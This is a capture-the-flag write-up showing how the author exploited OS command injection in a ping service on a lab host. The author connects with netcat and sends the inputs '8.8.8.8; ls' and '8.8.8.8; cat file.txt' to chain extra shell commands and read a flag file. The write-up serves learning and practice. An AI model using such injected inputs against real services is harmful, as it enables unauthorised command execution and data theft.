---
title: "Ping Command: Command Injection in Network Utility"
event: "CyLab Academy"
category: "Misc"
difficulty: "Easy"
solvedDate: 2026-08-25
tags: ["misc", "command-injection", "bash", "netcat"]
isPublic: true
author: "AUKA"
summary: "Bypassing naive input validation on a network ping service using command chaining semicolons to execute arbitrary commands."
dossier:
  targetIp: "mysterious-sea.picoctf.net"
  os: "Linux"
  arch: "x86_64"
  cve: "CWE-78 (OS Command Injection)"
  services: ["TCP/Socket Service"]
---

## Phase 1: Reconnaissance via Netcat

The service asks for an IP address to ping:

```bash
# Connect to target service:
nc mysterious-sea.picoctf.net <PORT>

# Prompt:
# Enter IP to ping: 8.8.8.8
# PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data...
```

---

## Phase 2: Command Chaining & Arbitrary Execution

The backend concatenates the user input directly into a shell command such as `ping -c 1 {input}` without parameter sanitization. By appending `;`, we terminate the ping command and execute arbitrary commands.

```bash
# Listing files in the current working directory:
# Input:
8.8.8.8; ls

# Output reveals:
# file.txt
# ping.sh
```

---

## Phase 3: Reading the Flag File

We append `cat file.txt` to dump the flag contents:

```bash
# Exploit input:
8.8.8.8; cat file.txt
```

```text
Flag: [REDACTED - Click "Reveal Flag" below]
```
